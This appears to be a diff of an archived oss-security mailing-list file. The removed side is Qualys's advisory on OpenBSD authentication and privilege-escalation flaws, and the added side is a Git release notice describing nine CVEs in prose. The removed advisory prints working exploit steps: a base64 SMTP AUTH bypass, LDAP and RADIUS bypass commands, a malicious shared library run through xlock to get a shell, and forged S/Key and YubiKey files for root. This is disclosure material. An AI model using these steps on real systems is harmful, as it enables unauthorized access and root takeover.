@@ -1,461 +1,208 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/12/04/5
-Message-ID: <20191204204020.GB7012@localhost.localdomain>
-Date: Wed, 4 Dec 2019 20:49:22 +0000
-From: Qualys Security Advisory <qsa@...lys.com>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: Authentication vulnerabilities in OpenBSD
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/12/13/1
+Message-ID: <nycvar.QRO.7.76.6.1912131010150.46@gitforwindows.org>
+Date: Fri, 13 Dec 2019 11:22:01 +0100 (CET)
+From: Johannes Schindelin <Johannes.Schindelin@....de>
+To: oss-security@...ts.openwall.com
+Subject: Multiple vulnerabilities fixed in Git
 Content-Type: text/plain; charset=utf-8
 
+Team,
+
+[this is my first contribution to this list, I apologize in advance for
+any mistakes I made.]
+
+The Git project released new versions this past Tuesday, December 10th,
+2019, addressing a whopping 9 CVEs.
+
+All supported platforms are affected in one way or another, and apart from
+CVE-2019-19604 (which affects only Git v2.20.0 and later), all Git
+versions all the way back to 2.14.5 are affected (probably earlier ones,
+too, we just stopped looking further as the 2.14.x release train is the
+oldest we still service).
+
+The fixed versions are: 2.24.1, 2.23.1, 2.22.2, 2.21.1, 2.20.2, 2.19.3,
+2.18.2, 2.17.3, 2.16.6, 2.15.4, and 2.14.6. Link to the announcement:
+https://lore.kernel.org/git/xmqqr21cqcn9.fsf@gitster-ct.c.googlers.com/T/#u
+
+Git for Windows v2.24.1(2) is the only fixed version on Windows (there are
+only backports for the MinGit subset of Git for Windows):
+https://github.com/git-for-windows/git/releases/tag/v2.24.1.windows.2
+
+We highly recommend to upgrade. The addressed issues are:
+
+ * CVE-2019-1348:
+   The --export-marks option of git fast-import is exposed also via
+   the in-stream command feature export-marks=... and it allows
+   overwriting arbitrary paths.
+
+   The most obvious attack is to ask targeted users to import a malicious
+   payload.
+
+   See also the advisory at
+   https://github.com/git/git/security/advisories/GHSA-2pw3-gwg9-8pqr
+
+ * CVE-2019-1349:
+   When submodules are cloned recursively, under certain circumstances
+   Git could be fooled into using the same Git directory twice. We now
+   require the directory to be empty.
+
+   Our exploits for CVE-2019-1349 require Windows, but our impression is
+   that there might be a way to exploit this also on macOS (and possibly
+   Linux, maybe running in Windows Subsystem for Linux).
+
+   The exploit we found was to write a file `.git.1` into the submodule
+   directory (which would be associated with the NTFS short name `git~1`)
+   so that the second submodule, by reusing the same directory, would have
+   the NTFS short name `git~2` associated with the `.git` file, allowing
+   the `.git` file to be overwritten despite the protections of
+   `core.protectNTFS`, allowing remote code execution during a recursive
+   clone.
+
+   See also the advisory at
+   https://github.com/git/git/security/advisories/GHSA-4qvh-qvv7-frc7
+
+ * CVE-2019-1350:
+   Incorrect quoting of command-line arguments allowed remote code
+   execution during a recursive clone in conjunction with SSH URLs.
+
+   This is a Windows-only issue, as the vulnerable code is only compiled
+   on Windows. The exploit we found involves a submodule having a name
+   that ends in a backslash, and a maliciously-crafted SSH URL that
+   exploits the bug to pass arbitrary options to `ssh.exe`, allowing
+   remote code to be executed during a recursive clone.
+
+   See also the advisory at
+   https://github.com/git/git/security/advisories/GHSA-44fr-r2hj-3f4x
+
+ * CVE-2019-1351:
+   While the only permitted drive letters for physical drives on
+   Windows are letters of the US-English alphabet, this restriction
+   does not apply to virtual drives assigned via subst <letter>:
+   <path>. Git mistook such paths for relative paths, allowing writing
+   outside of the worktree while cloning.
+
+   This vulnerability can only be exploited on Windows, and only when the
+   targeted user is known to use non-alphabetical drive letters on logical
+   drives registered with the `subst.exe` command, allowing to overwrite
+   arbitrary files on said logical drive during a regular `git clone`.
+
+   See also the advisory at
+   https://github.com/git/git/security/advisories/GHSA-39hj-fvvf-mq4f
+
+ * CVE-2019-1352:
+   Git was unaware of NTFS Alternate Data Streams, allowing files
+   inside the .git/ directory to be overwritten during a clone.
+
+   While the description contains "NTFS", this vulnerability can not only
+   be exploited on Windows, but also on macOS when working on
+   `smb://`-mounted network shares. The exploit involves naming a
+   directory `.git::$INDEX_ALLOCATION`, allowing remote code execution
+   during a regular `git clone`.
+
+   The fix for this CVE requires the fix for CVE-2019-1353.
+
+   See also the advisory at
+   https://github.com/git/git/security/advisories/GHSA-5wph-8frv-58vj
+
+ * CVE-2019-1353:
+   When running Git in the Windows Subsystem for Linux (also known as
+   "WSL") while accessing a working directory on a regular Windows
+   drive, none of the NTFS protections were active.
+
+   This vulnerability affects Git when running inside the Windows
+   Subsystem for Linux (https://docs.microsoft.com/en-us/windows/wsl/about)
+   and only when working on Windows drives where NTFS short names are
+   enabled (which is the case, by default, for the system drive, i.e. `C:`).
+
+   The exploit uses a directory named `git~1` and it allows remote code
+   execution during a regular `git clone`.
+
+   For this reason, Git now turns on `core.protectNTFS` by default, which
+   is also required to address CVE-2019-1352.
+
+   See also the advisory at
+   https://github.com/git/git/security/advisories/GHSA-589j-mmg9-733v
+
+ * CVE-2019-1354:
+   Filenames on Linux/Unix can contain backslashes. On Windows,
+   backslashes are directory separators. Git did not use to refuse to
+   write out tracked files with such filenames.
+
+   This is a Windows-only vulnerability. The exploit uses backslashes in
+   the file names stored in tree objects, allowing arbitrary files even
+   outside of the Git worktree to be (over-)written.
+
+   See also the advisory at
+   https://github.com/git/git/security/advisories/GHSA-xjx4-8694-q2fq
+
+ * CVE-2019-1387:
+   Recursive clones are currently affected by a vulnerability that is
+   caused by too-lax validation of submodule names, allowing very
+   targeted attacks via remote code execution in recursive clones.
+
+   This is a fun one, as the only exploit we found is _very_ complex,
+   _and_ it allows for only very targeted attacks as not only the
+   `user.name`/`user.email` of the targeted user have to be known, it also
+   requires controlling at least one web server from which at least one
+   submodule is served. The exploit also requires colons to be valid
+   characters in file names, i.e. it does not work if the targeted user
+   uses Windows (unless using Git inside the Windows Subsystem for Linux).
+
+   The idea is to force Git to create two files in the same directory,
+   commondir and HEAD. This will fool Git into believing that this is a
+   valid Git directory. As both `commondir` and `HEAD` are valid branch
+   names, it is possible to abuse the reflogs directory for that. By
+   default, the reflogs' contents have the format
+
+   	<old-hash> <new-hash> <ident> <epoch> <tz><tab>clone: from <url>
+
+   By naming another submodule so that its name nests with the reflogs
+   directory, we can ensure that a directory exists whose name is identical
+   to the first part of the reflog entry right up until the first slash of
+   the URL (this contains colons, and is therefore not a legal directory
+   name on Windows). By using `../` in the URL, this can break out of the git
+   directory and redirect the commondir to a directory that was written as
+   part of the recursive clone.
+
+   Note that the targeted user's ident needs to be known, as well as at
+   least a reasonably small time range of the attack, to allow for crafting
+   such submodule names.
+
+   Note also that for a remote code execution _during_ the recursive clone,
+   the attacker needs to control a web server that backs one of the
+   submodules, to pretend that at least one of the refs is updated _during_
+   the recursive clone (which will ask for the set of refs _twice_, and
+   only when cloning via HTTP/HTTPS).
+
+   See also the advisory at
+   https://github.com/git/git/security/advisories/GHSA-4wfr-gwrh-8mj2
+
+ * CVE-2019-19604:
+   It is now disallowed for `.gitmodules` to have entries that set
+   `submodule.<name>.update=!<command>`. This fixes the vulnerability
+   in Git v2.20.0 and later where a recursive clone followed by a
+   submodule update could execute code contained within the repository
+   without the user explicitly having asked for that.
+
+   The exploit stores a command in the `.gitmodules` file that points to a
+   script or executable that is written as part of the initial clone.
+
+   Technically, this is not a remote code execution vulnerability because
+   there is a time window between the initial recursive clone and the call
+   to `git submodule update` during which the user can inspect the
+   malicious payload.
+
+   See also the advisory at
+   https://github.com/git/git/security/advisories/GHSA-cj5c-9839-g2ch
+
+Credit for finding the first 8 vulnerabilities goes to Microsoft Security
+Response Center, in particular to Nicolas Joly. Credit for finding the
+submodule `update=!command` vulnerability goes to Joern Schneeweisz,
+credit for fixing it goes to Jonathan Nieder. The `fast-import` fixes were
+provided by Jeff King, the other fixes by myself with help from Garima
+Singh.
+
+Thanks,
+Johannes
 
-Qualys Security Advisory
-
-Authentication vulnerabilities in OpenBSD
-
-
-==============================================================================
-Contents
-==============================================================================
-
-1. CVE-2019-19521: Authentication bypass
-   1.1. Analysis
-   1.2. Case study: smtpd
-   1.3. Case study: ldapd
-   1.4. Case study: radiusd
-   1.5. Case study: sshd
-   1.6. Case study: su
-2. CVE-2019-19520: Local privilege escalation via xlock
-3. CVE-2019-19522: Local privilege escalation via S/Key and YubiKey
-4. CVE-2019-19519: Local privilege escalation via su
-5. Acknowledgments
-
-
-==============================================================================
-1. CVE-2019-19521: Authentication bypass
-==============================================================================
-
-We discovered an authentication-bypass vulnerability in OpenBSD's
-authentication system: this vulnerability is remotely exploitable in
-smtpd, ldapd, and radiusd, but its real-world impact should be studied
-on a case-by-case basis. For example, sshd is not exploitable thanks to
-its defense-in-depth mechanisms.
-
-
-==============================================================================
-1.1. Analysis
-==============================================================================
-
-From the manual page of login.conf:
-
-------------------------------------------------------------------------------
-     OpenBSD uses BSD Authentication, which is made up of a variety of
-     authentication styles.  The authentication styles currently provided are:
-     ...
-     passwd     Request a password and check it against the password in the
-                master.passwd file.  See login_passwd(8).
-     ...
-     skey       Send a challenge and request a response, checking it with
-                S/Key (tm) authentication.  See login_skey(8).
-     ...
-     yubikey    Authenticate using a Yubico YubiKey token.  See
-                login_yubikey(8).
-     ...
-     For any given style, the program /usr/libexec/auth/login_style is used to
-     perform the authentication.  The synopsis of this program is:
-
-     /usr/libexec/auth/login_style [-v name=value] [-s service] username class
-------------------------------------------------------------------------------
-
-This is the first piece of the puzzle: if an attacker specifies a
-username of the form "-option", they can influence the behavior of the
-authentication program in unexpected ways.
-
-From the manual page of login_passwd:
-
-------------------------------------------------------------------------------
-     login_passwd [-s service] [-v wheel=yes|no] [-v lastchance=yes|no] user
-                  [class]
-     ...
-     The service argument specifies which protocol to use with the invoking
-     program.  The allowed protocols are login, challenge, and response.  (The
-     challenge protocol is silently ignored but will report success as passwd-
-     style authentication is not challenge-response based).
-------------------------------------------------------------------------------
-
-This is the second piece of the puzzle: if an attacker specifies the
-username "-schallenge" (or "-schallenge:passwd" to force a passwd-style
-authentication), then the authentication is automatically successful and
-therefore bypassed.
-
-
-==============================================================================
-1.2. Case study: smtpd
-==============================================================================
-
-To demonstrate how smtpd's authentication can be bypassed, we follow the
-instructions from the manual page of smtpd.conf:
-
-------------------------------------------------------------------------------
-     In this second example, the aim is to permit mail delivery and relaying
-     only for users that can authenticate (using their normal login
-     credentials).
-           ...
-           listen on egress tls pki mail.example.com auth
-           ...
-           match auth from any for any action "outbound"
-------------------------------------------------------------------------------
-
-and we restart smtpd. Then, with our remote-attacker hat on:
-
-------------------------------------------------------------------------------
-$ printf '\0-schallenge\0whatever' | openssl base64
-AC1zY2hhbGxlbmdlAHdoYXRldmVy
-
-$ openssl s_client -connect 192.168.56.121:25 -starttls smtp
-...
-EHLO client.example.com
-...
-AUTH PLAIN AC1zY2hhbGxlbmdlAHdoYXRldmVy
-235 2.0.0 Authentication succeeded
-------------------------------------------------------------------------------
-
-
-==============================================================================
-1.3. Case study: ldapd
-==============================================================================
-
-From the manual page of ldapd:
-
-------------------------------------------------------------------------------
-     ldapd can authenticate users via simple binds or SASL with the PLAIN
-     mechanism.
-     ...
-     When using SASL binds, the authentication ID should be a valid username
-     for BSD Authentication.
-
-     For plain text passwords to be accepted, the connection must be
-     considered secure, either by using an encrypted connection, or by using
-     the secure keyword in the configuration file.
-------------------------------------------------------------------------------
-
-Over such a secure connection, a remote attacker can bypass ldapd's SASL
-authentication:
-
-------------------------------------------------------------------------------
-$ ldapsearch -H ldap://192.168.56.121 -O none -U invaliduser -w whatever
-SASL/PLAIN authentication started
-ldap_sasl_interactive_bind_s: Invalid credentials (49)
-
-$ ldapsearch -H ldap://192.168.56.121 -O none -U -schallenge -w whatever
-SASL/PLAIN authentication started
-SASL username: -schallenge
-...
-# numResponses: 1
-------------------------------------------------------------------------------
-
-
-==============================================================================
-1.4. Case study: radiusd
-==============================================================================
-
-To show how radiusd's authentication can be bypassed, we adapt the
-configuration example from the manual page of radiusd.conf:
-
-------------------------------------------------------------------------------
-           module load "bsdauth" "/usr/libexec/radiusd/radiusd_bsdauth"
-           ...
-           authenticate * {
-                   authenticate-by "bsdauth"
-           }
-------------------------------------------------------------------------------
-
-and we send the following (successful) authentication request:
-
-------------------------------------------------------------------------------
-$ radiusctl test 192.168.56.121 secret -schallenge password whatever
-    ...
-    Reply-Message             = "Authentication succeeded"
-------------------------------------------------------------------------------
-
-If we further modify radiusd's configuration to restrict access to the
-members of the group "operator":
-
-------------------------------------------------------------------------------
-           module set "bsdauth"  "restrict-group" "operator"
-------------------------------------------------------------------------------
-
-and send our authentication request, then radiusd_bsdauth crashes
-because of a NULL-pointer dereference (because getpwnam("-schallenge")
-returns NULL):
-
-------------------------------------------------------------------------------
- 80 int
- 81 main(int argc, char *argv[])
- 82 {
-...
-192                                 pw = getpwnam(user);
-...
-197                                 if (gr->gr_gid == pw->pw_gid) {
-------------------------------------------------------------------------------
-
-
-==============================================================================
-1.5. Case study: sshd
-==============================================================================
-
-Even if an attacker were able to bypass sshd's authentication with an
-invalid user such as "-schallenge", sshd would eventually reject it:
-
-------------------------------------------------------------------------------
- 225 void
- 226 monitor_child_preauth(struct ssh *ssh, struct monitor *pmonitor)
- 227 {
- ...
- 229         int authenticated = 0, partial = 0;
- ...
- 249         while (!authenticated) {
- ...
- 288         }
- 289
- 290         if (!authctxt->valid)
- 291                 fatal("%s: authenticated invalid user", __func__);
-------------------------------------------------------------------------------
-
-Nevertheless, we can use sshd to remotely test whether an OpenBSD system
-is vulnerable to CVE-2019-19521 or not:
-
-------------------------------------------------------------------------------
-$ ssh -v -F /dev/null -o PreferredAuthentications=keyboard-interactive \
-      -o KbdInteractiveDevices=bsdauth -l -sresponse:passwd 192.168.56.121
-...
-debug1: Next authentication method: keyboard-interactive
-------------------------------------------------------------------------------
-
-It is vulnerable if the connection hangs, because sshd waits for
-login_passwd to send a challenge, while login_passwd waits for sshd to
-send a response (because login_passwd interprets the username
-"-sresponse" as an option).
-
-
-==============================================================================
-1.6. Case study: su
-==============================================================================
-
-A local attacker can bypass su's authentication for the invalid user
-"-schallenge", but su eventually crashes because of a NULL-pointer
-dereference (because getpwnam_r("-schallenge", ...) returns NULL):
-
-------------------------------------------------------------------------------
-$ su -L -- -schallenge
-Segmentation fault
-------------------------------------------------------------------------------
-
-
-==============================================================================
-2. CVE-2019-19520: Local privilege escalation via xlock
-==============================================================================
-
-On OpenBSD, /usr/X11R6/bin/xlock is installed by default and is
-set-group-ID "auth", not set-user-ID; the following check is therefore
-incomplete and should use issetugid() instead:
-
-------------------------------------------------------------------------------
-101 _X_HIDDEN void *
-102 driOpenDriver(const char *driverName)
-103 {
-...
-113    if (geteuid() == getuid()) {
-114       /* don't allow setuid apps to use LIBGL_DRIVERS_PATH */
-115       libPaths = getenv("LIBGL_DRIVERS_PATH");
-------------------------------------------------------------------------------
-
-A local attacker can exploit this vulnerability and dlopen() their own
-driver to obtain the privileges of the group "auth":
-
-------------------------------------------------------------------------------
-$ id
-uid=32767(nobody) gid=32767(nobody) groups=32767(nobody)
-
-$ cd /tmp
-
-$ cat > swrast_dri.c << "EOF"
-#include <paths.h>
-#include <sys/types.h>
-#include <unistd.h>
-
-static void __attribute__ ((constructor)) _init (void) {
-    gid_t rgid, egid, sgid;
-    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
-    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);
-
-    char * const argv[] = { _PATH_KSHELL, NULL };
-    execve(argv[0], argv, NULL);
-    _exit(__LINE__);
-}
-EOF
-
-$ gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c
-
-$ env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &
-[1] 2706
-
-$ env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66
-
-$ id
-uid=32767(nobody) gid=11(auth) groups=32767(nobody)
-------------------------------------------------------------------------------
-
-
-==============================================================================
-3. CVE-2019-19522: Local privilege escalation via S/Key and YubiKey
-==============================================================================
-
-If the S/Key or YubiKey authentication type is enabled (they are both
-installed by default but disabled), then a local attacker can exploit
-the privileges of the group "auth" to obtain the full privileges of the
-user "root" (because login_skey and login_yubikey do not verify that the
-files in /etc/skey and /var/db/yubikey belong to the correct user, and
-these directories are both writable by the group "auth").
-
-(Note: to obtain the privileges of the group "auth", a local attacker
-can first exploit CVE-2019-19520 in xlock.)
-
-If S/Key is enabled (via skeyinit -E), a local attacker with "auth"
-privileges can add an S/Key entry (a file in /etc/skey) for the user
-"root" (if this file already exists, the attacker cannot simply remove
-or rename it, because /etc/skey is sticky; a simple workaround exists,
-and is left as an exercise for the interested reader):
-
-------------------------------------------------------------------------------
-$ id
-uid=32767(nobody) gid=11(auth) groups=32767(nobody)
-
-$ echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root
-
-$ chmod 0600 /etc/skey/root
-
-$ env -i TERM=vt220 su -l -a skey
-otp-md5 99 obsd91335
-S/Key Password: EGG LARD GROW HOG DRAG LAIN
-
-# id
-uid=0(root) gid=0(wheel) ...
-------------------------------------------------------------------------------
-
-If YubiKey is enabled (via login.conf), a local attacker with "auth"
-privileges can add a YubiKey entry (two files in /var/db/yubikey) for
-the user "root" (if these files already exist, the attacker can simply
-remove or rename them, because /var/db/yubikey is not sticky):
-
-------------------------------------------------------------------------------
-$ id
-uid=32767(nobody) gid=11(auth) groups=32767(nobody)
-
-$ echo 32d32ddfb7d5 > /var/db/yubikey/root.uid
-
-$ echo 554d5eedfd75fb96cc74d52609505216 > /var/db/yubikey/root.key
-
-$ env -i TERM=vt220 su -l -a yubikey
-Password: krkhgtuhdnjclrikikklulkldlutreul
-
-# id
-uid=0(root) gid=0(wheel) ...
-------------------------------------------------------------------------------
-
-
-==============================================================================
-4. CVE-2019-19519: Local privilege escalation via su
-==============================================================================
-
-A local attacker can exploit su's -L option ("Loop until a correct
-username and password combination is entered") to log in as themselves
-but with another user's login class (with the exception of root's login
-class if the attacker is not in the group "wheel"), because the class
-variable is set once and never reset:
-
-------------------------------------------------------------------------------
- 60 int
- 61 main(int argc, char **argv)
- 62 {
-...
-174         for (;;) {
-...
-210                 if (!class && pwd && pwd->pw_class && pwd->pw_class[0] != '\0')
-211                         class = strdup(pwd->pw_class);
-------------------------------------------------------------------------------
-
-In the following example, Jane (who is a member of the group "wheel")
-logs in with root's login class ("daemon"), thereby increasing her
-resource limits:
-
-------------------------------------------------------------------------------
-$ id
-uid=1000(jane) gid=1000(jane) groups=1000(jane), 0(wheel)
-
-$ ulimit -H -a
-...
-processes            512
-
-$ su -l -L
-login: root
-Password:
-Login incorrect
-login: jane
-Password:
-
-$ id
-uid=1000(jane) gid=1000(jane) groups=1000(jane), 0(wheel)
-
-$ ulimit -H -a
-...
-processes            1310
-------------------------------------------------------------------------------
-
-In the following example, John (who is not a member of the group
-"wheel") logs in with _pbuild's login class ("pbuild"), thereby
-increasing his resource limits:
-
-------------------------------------------------------------------------------
-$ id
-uid=1001(john) gid=1001(john) groups=1001(john)
-
-$ ulimit -H -a
-...
-data(kbytes)         786432
-...
-processes            256
-
-$ su -l -L
-login: _pbuild
-Password:
-Login incorrect
-login: john
-Password:
-
-$ id
-uid=1001(john) gid=1001(john) groups=1001(john)
-
-$ ulimit -H -a
-...
-data(kbytes)         33554432
-...
-processes            1024
-------------------------------------------------------------------------------
-
-
-==============================================================================
-5. Acknowledgments
-==============================================================================
-
-We thank Theo de Raadt and the OpenBSD developers for their incredibly
-quick response: they published patches for these vulnerabilities less
-than 40 hours after our initial contact. We also thank MITRE's CVE
-Assignment Team.
-
-
-
-[https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png]<https://www.qualys.com/email-banner>
-
-
-
-This message may contain confidential and privileged information. If it has been sent to you in error, please reply to advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read, copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us.
